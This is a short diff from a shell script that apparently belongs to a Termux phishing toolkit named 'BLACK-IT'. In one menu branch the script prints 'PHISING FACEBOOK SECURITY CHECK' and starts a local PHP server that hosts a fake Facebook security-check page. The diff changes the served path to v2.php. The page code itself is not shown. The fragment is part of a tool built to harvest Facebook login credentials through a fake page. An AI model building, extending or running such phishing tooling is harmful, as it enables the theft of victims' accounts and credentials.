@@ -63,7 +63,7 @@ echo $pur"now open new session and run Next.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 -t /data/data/com.termux/files/home/BLACK-IT/v1
+php -S localhost:8080 v2.php
 fi
 
 if [ $pil = 3 ]
